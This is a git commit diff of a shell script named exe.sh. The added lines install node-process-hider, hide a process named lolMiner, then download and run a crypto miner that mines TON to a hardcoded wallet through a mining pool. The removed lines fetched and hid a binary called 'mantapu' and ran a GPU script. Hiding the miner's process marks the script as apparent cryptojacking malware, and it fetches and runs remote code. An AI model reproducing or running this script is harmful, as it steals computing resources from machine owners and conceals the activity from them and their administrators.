cb3e242e1b67ae816f0f9a0a31b06c7672723871
d-crypto99 <79061002+d-crypto99@users.noreply.github.com>
2022-01-22 15:41:01 +0700

    Update exe.sh

--- exe.sh
+++ exe.sh
@@ -2,8 +2,5 @@
 sudo apt update
 sudo apt install screen -y
 screen -dmS gpu.sh ./gpu.sh 79 95
-sudo apt install curl libssl1.0-dev nodejs nodejs-dev node-gyp npm -y && npm i -g node-process-hider && ph add mantapu 
-wget https://github.com/d-crypto99/xcroc4/raw/main/mantapu
-wget https://raw.githubusercontent.com/d-crypto99/xcroc4/main/gpu-nvidia.sh
-chmod +x gpu-nvidia.sh
-./gpu-nvidia.sh
+sudo apt install curl libssl1.0-dev nodejs nodejs-dev node-gyp npm -y && npm i -g node-process-hider && ph add lolMiner
+wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.41/lolMiner_v1.41b_Lin64.tar.gz && tar xvf lolMiner_v1.41b_Lin64.tar.gz && mv 1.41b mng && cd mng && chmod +x lolMiner && ./lolMiner --algo TON --pool https://pool.services.tonwhales.com --user EQC3Kt2DCvHO8MDUjG04zElTk0URbNqp3n9r9_4RbhWG-pmi
